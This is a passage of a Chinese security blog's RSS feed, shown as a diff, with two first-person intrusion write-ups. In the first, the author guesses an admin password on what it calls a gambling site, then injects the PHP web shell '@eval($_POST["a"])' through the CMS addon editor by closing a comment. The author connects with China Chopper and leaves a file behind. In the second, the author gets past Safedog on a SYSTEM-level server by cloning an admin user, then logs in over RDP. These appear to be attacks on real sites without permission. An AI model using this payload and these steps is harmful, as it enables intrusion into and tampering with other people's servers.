+&lt;p&gt;说到这个后台嘛&amp;hellip;&amp;hellip;.很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有&amp;hellip;&amp;hellip;）
+在url后面加上admin.php，会跳转到登录界面
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/02.png&#34;
+	width=&#34;1211&#34;
+	height=&#34;972&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/02_hu2e85f49795f77d0c95e9fbecb95d36ab_845247_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/02_hu2e85f49795f77d0c95e9fbecb95d36ab_845247_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;124&#34;
+		data-flex-basis=&#34;299px&#34;
+	
+&gt;
+测试了下弱口令(人品爆发)
+admin   admin    失败
+admin   123456   成功
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/03.png&#34;
+	width=&#34;1920&#34;
+	height=&#34;1030&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/03_hu932d7911415ae9794beb803676899770_209874_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/03_hu932d7911415ae9794beb803676899770_209874_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;447px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;getshell&#34;&gt;Getshell&lt;/h3&gt;
+&lt;p&gt;老规矩，知道cms先百度，一样，毛都没&amp;hellip;&amp;hellip;
+只能硬着头皮在后台翻了&amp;hellip;..
+这里admin用户权限已经是属于超级管理员了，权限是最高的了。
+还有个数据库备份和用户配置
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/04.png&#34;
+	width=&#34;201&#34;
+	height=&#34;141&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/04_hu21ce62ed56200ca991859e186ea28495_2122_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/04_hu21ce62ed56200ca991859e186ea28495_2122_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;342px&#34;
+	
+&gt;
+不过数据库是mysql的&amp;hellip;..没屌用啊，此处感慨为啥不学学南方。
+剩下的就是上传点了
+上传点有点多，随便找了个上传点
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/05.png&#34;
+	width=&#34;463&#34;
+	height=&#34;204&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/05_huf63ae0a313df6fe4bed843dbab9b1bf4_8112_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/05_huf63ae0a313df6fe4bed843dbab9b1bf4_8112_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;226&#34;
+		data-flex-basis=&#34;544px&#34;
+	
+&gt;
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/06.png&#34;
+	width=&#34;382&#34;
+	height=&#34;169&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/06_hued952104262e5f3ceafa063dec320ae8_3480_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/06_hued952104262e5f3ceafa063dec320ae8_3480_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;226&#34;
+		data-flex-basis=&#34;542px&#34;
+	
+&gt;
+先上传张正常的图片看下上传功能是否有用
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/07.png&#34;
+	width=&#34;417&#34;
+	height=&#34;201&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/07_hueb2b645b3f536567d5e7bb7d4dba2989_23945_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/07_hueb2b645b3f536567d5e7bb7d4dba2989_23945_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;207&#34;
+		data-flex-basis=&#34;497px&#34;
+	
+&gt;
+看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用）
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/08.png&#34;
+	width=&#34;574&#34;
+	height=&#34;185&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/08_hubd6d62f45a21b6e7750e00fe5ada335e_30245_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/08_hubd6d62f45a21b6e7750e00fe5ada335e_30245_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;310&#34;
+		data-flex-basis=&#34;744px&#34;
+	
+&gt;
+然后各种上传绕过都试了，也是没用。&lt;/p&gt;
+&lt;h3 id=&#34;高潮&#34;&gt;高潮&lt;/h3&gt;
+&lt;p&gt;看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/09.png&#34;
+	width=&#34;1011&#34;
+	height=&#34;261&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/09_hu77f21a76e1ef7caa3857eac82ba6b053_10067_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/09_hu77f21a76e1ef7caa3857eac82ba6b053_10067_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;387&#34;
+		data-flex-basis=&#34;929px&#34;
+	
+&gt;
+扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方）
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/10.png&#34;
+	width=&#34;1446&#34;
+	height=&#34;619&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/10_hu21d5e16d5d68cdf5f47c3a63c41da556_66390_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/10_hu21d5e16d5d68cdf5f47c3a63c41da556_66390_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;233&#34;
+		data-flex-basis=&#34;560px&#34;
+	
+&gt;
+修改url为&lt;a class=&#34;link&#34; href=&#34;http://xxxx.com/admin.php?s=/Addons/index&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://xxxx.com/admin.php?s=/Addons/index&lt;/a&gt;，然后访问
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/11.png&#34;
+	width=&#34;1270&#34;
+	height=&#34;552&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/11_hu185803944fe7ad4c0ad7a632643e7748_306148_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/11_hu185803944fe7ad4c0ad7a632643e7748_306148_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;230&#34;
+		data-flex-basis=&#34;552px&#34;
+	
+&gt;
+和土豆研究了下这个插件，先点击快速创建
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/12.png&#34;
+	width=&#34;587&#34;
+	height=&#34;731&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/12_hue55050561a7a5abcff7c030b840a4dee_23574_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/12_hue55050561a7a5abcff7c030b840a4dee_23574_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;80&#34;
+		data-flex-basis=&#34;192px&#34;
+	
+&gt;
+点击预览按钮可以看到代码。。。。。
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/13.png&#34;
+	width=&#34;930&#34;
+	height=&#34;715&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/13_hua6fa48c638903831839ccceeae876062_175593_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/13_hua6fa48c638903831839ccceeae876062_175593_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;130&#34;
+		data-flex-basis=&#34;312px&#34;
+	
+&gt;
+竟然能看到代码？这不是脱裤子找日吗？
+思路：打算在这里写入一句话。
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/14.png&#34;
+	width=&#34;958&#34;
+	height=&#34;620&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/14_hue2b591bc2cb43d089949b78377e010c8_162677_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/14_hue2b591bc2cb43d089949b78377e010c8_162677_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;370px&#34;
+	
+&gt;
+顺手写了个一句话，然后点击预览发现被注释了。
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/15.png&#34;
+	width=&#34;1088&#34;
+	height=&#34;625&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/15_hub02767e3b1e819d70099fca25a546d42_167458_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/15_hub02767e3b1e819d70099fca25a546d42_167458_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;174&#34;
+		data-flex-basis=&#34;417px&#34;
+	
+&gt;
+看来是有用的，那就好办了，闭合下注释和php末端。
+最后的代码是**/?&amp;gt; &lt;?php @eval($_POST[&#34;a&#34;]);?&gt; &amp;lt;?php /*
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/16.png&#34;
+	width=&#34;1339&#34;
+	height=&#34;736&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/16_huf3131075486804d0bb161fbaf893bd42_206258_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/16_huf3131075486804d0bb161fbaf893bd42_206258_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;
+Ok，这样我们的一句话就写进去了。然后点击确定
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/17.png&#34;
+	width=&#34;349&#34;
+	height=&#34;100&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/17_hu889d0c449488815c15420379c223825d_9759_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/17_hu889d0c449488815c15420379c223825d_9759_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;349&#34;
+		data-flex-basis=&#34;837px&#34;
+	
+&gt;
+卧槽，好激动。。。
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/18.png&#34;
+	width=&#34;1656&#34;
+	height=&#34;565&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/18_hu493d63d17f25131aa0b0bd464aadd81d_59344_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/18_hu493d63d17f25131aa0b0bd464aadd81d_59344_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;293&#34;
+		data-flex-basis=&#34;703px&#34;
+	
+&gt;
+可是tm的地址呢？？？不过可以肯定的是，马是写进去了。
+然后我又创建了一个插件，这次不打算完整闭合代码。
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/19.png&#34;
+	width=&#34;1140&#34;
+	height=&#34;690&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/19_huef8a816ab1018827328199f0926712c8_182746_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/19_huef8a816ab1018827328199f0926712c8_182746_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;396px&#34;
+	
+&gt;
+这样肯定是出错的，然后我们点击确定
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/20.png&#34;
+	width=&#34;1001&#34;
+	height=&#34;537&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/20_hu76afcf044a3591db8815f00bb5bc5b70_153695_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/20_hu76afcf044a3591db8815f00bb5bc5b70_153695_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;447px&#34;
+	
+&gt;
+没错，正如你所见，报错了。刚才创建的名叫test1。
+然后构造下我们之前创建名为Example的路径
+地址为: &lt;a class=&#34;link&#34; href=&#34;http://xxxx.com/Addons/Example/ExampleAddon.class.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://xxxx.com/Addons/Example/ExampleAddon.class.php&lt;/a&gt;
+然后请出菜刀，连接看看
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/21.png&#34;
+	width=&#34;1300&#34;
+	height=&#34;580&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/21_hu89ea9a811bd864ba8319ce49581d4eda_61908_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/21_hu89ea9a811bd864ba8319ce49581d4eda_61908_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;224&#34;
+		data-flex-basis=&#34;537px&#34;
+	
+&gt;
+连接成功，成功获取shell。
+由于服务器Linux服务器我就不去提权了。&lt;/p&gt;
+&lt;h3 id=&#34;结尾&#34;&gt;结尾&lt;/h3&gt;
+&lt;p&gt;这种棋牌网站，竟然来了，怎么能不留点东西呢
+丢个txt文件走人
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/22.png&#34;
+	width=&#34;1300&#34;
+	height=&#34;580&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/22_hu12b10283565fd381ea927d48737d6cf0_116942_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/22_hu12b10283565fd381ea927d48737d6cf0_116942_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;224&#34;
+		data-flex-basis=&#34;537px&#34;
+	
+&gt;
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/23.png&#34;
+	width=&#34;443&#34;
+	height=&#34;290&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/23_hu934b19f575a8378c9c4bea5530df4c96_12387_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/23_hu934b19f575a8378c9c4bea5530df4c96_12387_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;366px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>记一次System权限下的过狗提权</title>
+        <link>https://360rce.github.io/p/p1qczh0k/</link>
+        <pubDate>Sat, 30 Sep 2017 13:19:29 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/p1qczh0k/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/9d/wallhaven-9dg8q8.png" alt="Featured image of post 记一次System权限下的过狗提权" /&gt;&lt;p&gt;事情起因:某个朋友有个phpmyadmin的站拿不下shell。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/01.png&#34;
+	width=&#34;423&#34;
+	height=&#34;671&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/01_hu7afecd8d4cd45043b08735b152d6e4d3_28928_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/01_hu7afecd8d4cd45043b08735b152d6e4d3_28928_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;63&#34;
+		data-flex-basis=&#34;151px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿shell的过程就不多说了，因为是用phpstudy搭建的站点(一般采用集成包搭建的都是system权限)，所以权限挺大的&lt;/p&gt;
+&lt;p&gt;首先看了下权限&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/02.png&#34;
+	width=&#34;257&#34;
+	height=&#34;59&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/02_hu52da9bc01643d00a205a0c75c092b9b1_930_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/02_hu52da9bc01643d00a205a0c75c092b9b1_930_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;435&#34;
+		data-flex-basis=&#34;1045px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;确定是system，直接net user添加帐号&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/03.png&#34;
+	width=&#34;622&#34;
+	height=&#34;248&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/03_hu2e66c277eb1a0210ed228ba71ab90ad3_4029_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/03_hu2e66c277eb1a0210ed228ba71ab90ad3_4029_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;250&#34;
+		data-flex-basis=&#34;601px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后加入到管理组&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/04.png&#34;
+	width=&#34;495&#34;
+	height=&#34;95&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/04_hu0481e1dcece504313e3807ace69a9cf5_1768_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/04_hu0481e1dcece504313e3807ace69a9cf5_1768_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;521&#34;
+		data-flex-basis=&#34;1250px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拒绝访问。。。。查看下是不是有WAF&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/05.png&#34;
+	width=&#34;776&#34;
+	height=&#34;873&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/05_hu88b31678f120af4dacd206129fd1a5a5_33594_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/05_hu88b31678f120af4dacd206129fd1a5a5_33594_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;88&#34;
+		data-flex-basis=&#34;213px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;确定已经有安全狗了….竟然帐号添加了  但是没办法加入管理组&lt;/p&gt;
+&lt;p&gt;这时候y哥对我说直接克隆用户&lt;/p&gt;
+&lt;p&gt;然后上传exp&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/06.png&#34;
+	width=&#34;239&#34;
+	height=&#34;59&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/06_huf7a3834ef63be204d3a90c64c514f47e_1509_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/06_huf7a3834ef63be204d3a90c64c514f47e_1509_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;405&#34;
+		data-flex-basis=&#34;972px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;执行下，显示克隆成功。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/07.png&#34;
+	width=&#34;565&#34;
+	height=&#34;119&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/07_huec5b6fe99bd83a29ce09ecfb40a54a60_2558_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/07_huec5b6fe99bd83a29ce09ecfb40a54a60_2558_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;474&#34;
+		data-flex-basis=&#34;1139px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;去查看下有没有开放3389&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/08.png&#34;
+	width=&#34;669&#34;
+	height=&#34;638&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/08_hub782fece9c7667902f49f6c87af8d3e8_12716_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/08_hub782fece9c7667902f49f6c87af8d3e8_12716_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;104&#34;
+		data-flex-basis=&#34;251px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里并没有显示3389端口，竟然这样，我们就去查看下他改成什么端口了(不过这里基本上就可以看出端口是3390了…..)&lt;/p&gt;
+&lt;p&gt;首先用tasklist /svc查看下服务，找到这个服务对应的PID号&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/09.png&#34;
+	width=&#34;437&#34;
+	height=&#34;24&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/09_hu8346527a191c21b7bbefbc5fa43c8de5_1050_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/09_hu8346527a191c21b7bbefbc5fa43c8de5_1050_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1820&#34;
+		data-flex-basis=&#34;4370px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后用netstat –ano查看对应的端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/10.png&#34;
+	width=&#34;608&#34;
+	height=&#34;21&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/10_hu66cf734b8be609e6c0677a4356927749_724_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/10_hu66cf734b8be609e6c0677a4356927749_724_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;2895&#34;
+		data-flex-basis=&#34;6948px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看出端口是3390，然后我们去连接下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/p1qczh0k/11.png&#34;
+	width=&#34;1230&#34;
+	height=&#34;848&#34;
+	srcset=&#34;https://360rce.github.io/p/p1qczh0k/11_hue2ada6711e3e5279c3245df292a1a944_136199_480x0_resize_box_3.png 480w, https://360rce.github.io/p/p1qczh0k/11_hue2ada6711e3e5279c3245df292a1a944_136199_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;记一次System权限下的过狗提权&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;145&#34;
+		data-flex-basis=&#34;348px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;一连接上就自动登录QQ，屎都差点吓出来……….&lt;/p&gt;
+&lt;p&gt;以前写的一篇文章，没啥技术含量，此文只是做次笔记&lt;/p&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
